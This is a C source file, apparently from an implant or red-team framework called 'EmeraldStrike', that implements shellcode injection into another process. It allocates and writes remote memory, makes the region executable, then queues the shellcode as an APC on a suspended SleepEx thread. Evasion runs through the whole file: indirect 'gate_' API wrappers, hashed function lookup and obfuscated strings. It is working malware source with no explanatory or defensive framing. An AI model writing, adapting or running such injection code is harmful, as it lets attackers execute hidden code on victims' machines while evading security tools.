// EmeraldStrike - Early Bird APC injection technique
#include "evasion/injection.h"
#include "common.h"
#include "config.h"

#if INJECTION_TECHNIQUE == INJECT_APC

HANDLE inject_apc(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (step) *step = 21;
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return NULL;

    if (step) *step = 22;
    SIZE_T written = 0;
    gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);

    if (step) *step = 23;
    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    if (step) *step = 24;
    HANDLE hThread = gate_CreateRemoteThread(inst,
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)resolve_function(inst->Modules.Kernel32,
            hash_string_djb2(XSTR("SleepEx"))),
        (LPVOID)(ULONG_PTR)INFINITE, CREATE_SUSPENDED, NULL);

    if (!hThread) return NULL;

    if (step) *step = 25;
    inst->Win32.QueueUserAPC((PAPCFUNC)remote, hThread, 0);
    gate_ResumeThread(inst, hThread);

    return hThread;
}

#endif // INJECT_APC
